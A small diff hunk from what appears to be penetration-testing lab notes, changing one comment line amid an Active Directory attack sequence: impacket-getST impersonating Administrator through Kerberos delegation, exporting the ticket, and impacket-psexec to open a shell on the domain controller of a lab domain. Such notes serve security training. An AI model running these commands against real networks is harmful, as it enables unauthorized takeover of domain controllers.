@@ -1188,7 +1188,7 @@ unset KRB5CCNAME
 impacket-getST -spn SRV/DC01 'INLANEFREIGHT.LOCAL/delegrate-User:pass' -impersonate Administrator -dc-ip 10.129.193.100 
 export KRB5CCNAME=./Administrator.ccache
 
-# vim /etc/hosts DC01
+# vim /etc/hosts DC01 (SPN)
 impacket-psexec -k -no-pass INLANEFREIGHT.LOCAL/administrator@DC01
 ```
 
